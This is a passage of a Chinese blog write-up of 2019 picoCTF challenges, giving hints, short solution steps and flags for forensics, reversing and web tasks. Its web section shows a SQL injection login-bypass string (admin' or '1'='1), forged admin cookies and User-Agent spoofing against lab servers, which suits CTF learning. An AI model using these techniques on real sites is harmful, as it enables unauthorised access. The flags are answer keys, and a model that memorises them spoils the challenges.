+</blockquote>
+<blockquote>
+<p>Hints: How do operating systems know what kind of file it is? (It’s not just the ending!<br>  Make sure to submit the flag as picoCTF{XXXXX}</p>
+</blockquote>
+<p>打开txt看到png头,改后缀为png</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./16.png" title="图片" data-fancybox="images"><img src="./16.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{now_you_know_about_extensions}</p>
+<h2 id="shark-on-wire-1-Points-150"><a href="#shark-on-wire-1-Points-150" class="headerlink" title="shark on wire 1 - Points: 150"></a>shark on wire 1 - Points: 150</h2><blockquote>
+<p>We found this packet capture. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.</p>
+</blockquote>
+<blockquote>
+<p>Hints: Try using a tool like Wireshark<br>  What are streams?</p>
+</blockquote>
+<p>根据hint追踪UDP流,得到flag</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./17.png" title="图片" data-fancybox="images"><img src="./17.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{StaT31355_636f6e6e}</p>
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="vault-door-training-Points-50"><a href="#vault-door-training-Points-50" class="headerlink" title="vault-door-training - Points: 50"></a>vault-door-training - Points: 50</h2><blockquote>
+<p>Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java</p>
+</blockquote>
+<blockquote>
+<p>Hints: The password is revealed in the program’s source code.</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./18.png" title="图片" data-fancybox="images"><img src="./18.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>查看源码,得到flag   picoCTF{w4rm1ng_Up_w1tH_jAv4_fcb79c48f5b}</p>
+<h2 id="vault-door-1-Points-100"><a href="#vault-door-1-Points-100" class="headerlink" title="vault-door-1 - Points: 100"></a>vault-door-1 - Points: 100</h2><blockquote>
+<p>This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java</p>
+</blockquote>
+<blockquote>
+<p>Hints: Look up the charAt() method online.</p>
+</blockquote>
+<p>按照 charAt() 方法顺序读出flag</p>
+<p>picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_63ef3a}</p>
+<h1 id="WEB应用"><a href="#WEB应用" class="headerlink" title="WEB应用"></a>WEB应用</h1><h2 id="Insp3ct0r-Points-50"><a href="#Insp3ct0r-Points-50" class="headerlink" title="Insp3ct0r - Points: 50"></a>Insp3ct0r - Points: 50</h2><blockquote>
+<p>Kishor Balan tipped us off that the following code may need inspection: <a href="https://2019shell1.picoctf.com/problem/9509/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/9509/</a> (link) or <a href="http://2019shell1.picoctf.com:9509" target="_blank" rel="noopener">http://2019shell1.picoctf.com:9509</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: How do you inspect web code on a browser?<br>  There’s 3 parts</p>
+</blockquote>
+<p>进页面后,分别在html,css,js代码里找到三个部分的flag</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./19.png" title="图片" data-fancybox="images"><img src="./19.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./20.png" title="图片" data-fancybox="images"><img src="./20.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./21.png" title="图片" data-fancybox="images"><img src="./21.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?8a7e3144}</p>
+<h2 id="dont-use-client-side-Points-100"><a href="#dont-use-client-side-Points-100" class="headerlink" title="dont-use-client-side - Points: 100"></a>dont-use-client-side - Points: 100</h2><blockquote>
+<p>Can you break into this super secure portal? <a href="https://2019shell1.picoctf.com/problem/49886/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49886/</a> (link) or <a href="http://2019shell1.picoctf.com:49886" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49886</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: Never trust the client</p>
+</blockquote>
+<p>调console看到js代码里的flag片段,flag可以由意思猜出来</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./22.png" title="图片" data-fancybox="images"><img src="./22.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{no_clients_plz_ee2f24}</p>
+<h2 id="logon-Points-100"><a href="#logon-Points-100" class="headerlink" title="logon - Points: 100"></a>logon - Points: 100</h2><blockquote>
+<p>The factory is hiding things from all of its users. Can you login as logon and find what they’ve been looking at? <a href="https://2019shell1.picoctf.com/problem/47307/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47307/</a> (link) or <a href="http://2019shell1.picoctf.com:47307" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47307</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: Hmm it doesn’t seem to check anyone’s password, except for ‘s?</p>
+</blockquote>
+<p>试了几个用户登进去都没有flag,后来F12进后台看cookie有admin=Flase,改成True就行</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./23.png" title="图片" data-fancybox="images"><img src="./23.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}</p>
+<h2 id="where-are-the-robots-Points-100"><a href="#where-are-the-robots-Points-100" class="headerlink" title="where are the robots - Points: 100"></a>where are the robots - Points: 100</h2><blockquote>
+<p>Can you find the robots? <a href="https://2019shell1.picoctf.com/problem/47235/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47235/</a> (link) or <a href="http://2019shell1.picoctf.com:47235" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47235</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: What part of the website could tell you where the creator doesn’t want you to look?</p>
+</blockquote>
+<p>查看robots.txt文件</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./24.png" title="图片" data-fancybox="images"><img src="./24.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./25.png" title="图片" data-fancybox="images"><img src="./25.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{ca1cu1at1ng_Mach1n3s_54e98}</p>
+<h2 id="Client-side-again-Points-200"><a href="#Client-side-again-Points-200" class="headerlink" title="Client-side-again - Points: 200"></a>Client-side-again - Points: 200</h2><blockquote>
+<p>Can you break into this super secure portal? <a href="https://2019shell1.picoctf.com/problem/47277/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47277/</a> (link) or <a href="http://2019shell1.picoctf.com:47277" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47277</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: What is obfuscation?</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./26.png" title="图片" data-fancybox="images"><img src="./26.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>混淆还是能猜出来是啥的  </p>
+<p>picoCTF{not_this_again_d29871}</p>
+<h2 id="Open-to-admins-Points-200"><a href="#Open-to-admins-Points-200" class="headerlink" title="Open-to-admins - Points: 200"></a>Open-to-admins - Points: 200</h2><blockquote>
+<p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/45127/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/45127/</a> (link) or <a href="http://2019shell1.picoctf.com:45127" target="_blank" rel="noopener">http://2019shell1.picoctf.com:45127</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: Can cookies help you to get the flag?</p>
+</blockquote>
+<p>同上一题,在cookie里添加两个变量</p>
+<p>admin=True,time=1400,得到flag</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./27.png" title="图片" data-fancybox="images"><img src="./27.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{0p3n_t0_adm1n5_42e59862}</p>
+<h2 id="picobrowser-Points-200"><a href="#picobrowser-Points-200" class="headerlink" title="picobrowser - Points: 200"></a>picobrowser - Points: 200</h2><blockquote>
+<p>This website can be rendered only by picobrowser, go and catch the flag! <a href="https://2019shell1.picoctf.com/problem/37829/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37829/</a> (link) or <a href="http://2019shell1.picoctf.com:37829" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37829</a></p>
+</blockquote>
+<blockquote>
+<p>Hints: You dont need to download a new web browser</p>
+</blockquote>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./28.png" title="图片" data-fancybox="images"><img src="./28.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>伪造一下UA头  picoCTF{p1c0_s3cr3t_ag3nt_7e9c671a}</p>
+<h2 id="Irish-Name-Repo-1-Points-300"><a href="#Irish-Name-Repo-1-Points-300" class="headerlink" title="Irish-Name-Repo 1 - Points: 300"></a>Irish-Name-Repo 1 - Points: 300</h2><blockquote>
+<p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/32241/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/32241/</a> (link) or <a href="http://2019shell1.picoctf.com:32241" target="_blank" rel="noopener">http://2019shell1.picoctf.com:32241</a>. Do you think you can log us in? Try to see if you can login!</p>
+</blockquote>
+<blockquote>
+<p>Hints: There doesn’t seem to be many ways to interact with this, I wonder if the users are kept in a database?<br>  Try to think about how does the website verify your login?</p>
+</blockquote>
+<p>用万能密码  admin’ or ‘1’=’1  直接可以登陆</p>
+<figure class="image-box">
+                <a rel=2019picoCTF部分wp(5000分记录) href="./29.png" title="图片" data-fancybox="images"><img src="./29.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{s0m3_SQL_0397f20c}</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-10-17T09:14:36.255Z" itemprop="dateUpdated">2020-10-17 17:14:36</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/ctf-writeup/ckwd8rd1p000348uc8fsdoez5/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup/ckwd8rd1p000348uc8fsdoez5/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人ctf竞赛/">个人ctf竞赛</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckwd8rd1p000348uc8fsdoez5/&title=《2019picoCTF部分wp(5000分记录)》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckwd8rd1p000348uc8fsdoez5/&title=《2019picoCTF部分wp(5000分记录)》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/ctf-writeup-web/ckwd8rd1l000148ucs5mt787a/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">20088靶场wp</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/ctf-writeup/ckwd8rd21000c48ucabfutbzm/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">2019HECTF wp</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一般技能"><span class="post-toc-number">1.</span> <span class="post-toc-text">一般技能</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#The-Factory’s-Secret-Points-1"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">The Factory’s Secret - Points: 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2Warm-Points-50"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">2Warm - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Lets-Warm-Up-Points-50"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Lets Warm Up - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Warmed-Up-Points-50"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Warmed Up - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Bases-Points-100"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">Bases - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#First-Grep-Points-100"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">First Grep - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Resources-Points-100"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">Resources - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#strings-it-Points-100"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">strings it - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#what’s-a-net-cat-Points-100"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">what’s a net cat? - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Based-Points-200"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">Based - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#First-Grep-Part-II-Points-200"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">First Grep: Part II - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#plumbing-Points-200"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">plumbing - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#where-is-the-file-Points-200"><span class="post-toc-number">1.13.</span> <span class="post-toc-text">where-is-the-file - Points: 200</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#二进制"><span class="post-toc-number">2.</span> <span class="post-toc-text">二进制</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#handy-shellcode-Points-50"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">handy-shellcode - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#practice-run-1-Points-50"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">practice-run-1 - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#OverFlow-0-Points-100"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">OverFlow 0 - Points: 100</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#密码学"><span class="post-toc-number">3.</span> <span class="post-toc-text">密码学</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#The-Numbers-Points-50"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">The Numbers - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#13-Points-100"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">13 - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Easy1-Points-100"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">Easy1 - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#caesar-Points-100"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">caesar - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Flags-Points-200"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">Flags - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Tapping-Points-200"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">Tapping - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#la-cifra-de-Points-200"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">la cifra de - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waves-over-lambda-Points-300"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">waves over lambda - Points: 300</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#杂项"><span class="post-toc-number">4.</span> <span class="post-toc-text">杂项</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Glory-of-the-Garden-Points-50"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Glory of the Garden - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#unzip-Points-50"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">unzip - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#So-Meta-Points-150"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">So Meta - Points: 150</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#What-Lies-Within-Points-150"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">What Lies Within - Points: 150</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#extensions-Points-150"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">extensions - Points: 150</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shark-on-wire-1-Points-150"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">shark on wire 1 - Points: 150</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#逆向"><span class="post-toc-number">5.</span> <span class="post-toc-text">逆向</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#vault-door-training-Points-50"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">vault-door-training - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#vault-door-1-Points-100"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">vault-door-1 - Points: 100</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB应用"><span class="post-toc-number">6.</span> <span class="post-toc-text">WEB应用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Insp3ct0r-Points-50"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">Insp3ct0r - Points: 50</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dont-use-client-side-Points-100"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">dont-use-client-side - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#logon-Points-100"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">logon - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#where-are-the-robots-Points-100"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">where are the robots - Points: 100</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Client-side-again-Points-200"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">Client-side-again - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Open-to-admins-Points-200"><span class="post-toc-number">6.6.</span> <span class="post-toc-text">Open-to-admins - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#picobrowser-Points-200"><span class="post-toc-number">6.7.</span> <span class="post-toc-text">picobrowser - Points: 200</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Irish-Name-Repo-1-Points-300"><span class="post-toc-number">6.8.</span> <span class="post-toc-text">Irish-Name-Repo 1 - Points: 300</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2021
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckwd8rd1p000348uc8fsdoez5/&title=《2019picoCTF部分wp(5000分记录)》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckwd8rd1p000348uc8fsdoez5/&title=《2019picoCTF部分wp(5000分记录)》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACqklEQVR42u3aQW7jQAwEwPz/07vXBRLL3eRMYCxKJyOWRyodxEmTX1/x8efb8erb51+9OvPf8/PrHjvw8PDw1rf+fbnk29mjyddP7ueH9fHw8PCu8Z5f0zkm+W3+4JI131jw8PDwPob3vI1+fvUnbDw8PLz/lbcJDlowHh4e3qfx8rihDQtmgcJzybmSteDh4eF1vaeoi/Q5n6/09/Dw8PDWXfVNO6rdrM+27G/uFg8PD+8Cr21ozSpPu3Vuo9s394mHh4d3lNe+fJNm/yaKPVWE8PDw8O7x2gLQBr6zQYS8YNTlCg8PD2/NyxnJI8jP3AQTeYnCw8PDu8FrS8IMuY82DnT28PDw8H6FNysPm5b/L02W4eHh4a15bRxwgzq7bvQtHh4e3lFevmjbBpttoGfb9JeBBR4eHt5lXnKBvNk/a6e12cJzocLDw8O7x2uLwWZjna+5Ga7Cw8PDu8dLLrAJDmYBRzLIVcTEeHh4eBd4eQNsFkzkba28GNRDrnh4eHhHeXlsmgDahzVrbhXxBx4eHt5RXvvCzWPcdlhqU0Je/h0PDw/vAm/2n3s+EJBHDPnjaMcO8PDw8O7xZq/g/RBA20IbjiDg4eHhXeAlp7atsllJmEUkRa8PDw8P7xpvNgiVrzYb5MoDFDw8PLx7vLxh32LyGLfdTB/YRuPh4eEd4p0NWDe33sbBUWHAw8PDO8qb9cpmL/dij78/8PDw8C7A9uNWz+fnA1ubbfQPxQwPDw/vAm/T1G8bYMnn5DEdwODh4eGtee3S9/a0eYHJBwvw8PDw7vHaYabNrbTNszZMwcPDw/t8XhsitJvmdjuOh4eH95m8WTOsDRfyttnhLTUeHh7eoTBiMyiQx8Gz6PZNYcDDw8M7ymv/4W+HCVav9XX7DQ8PD+8o7y+IrQMnC+wp2gAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
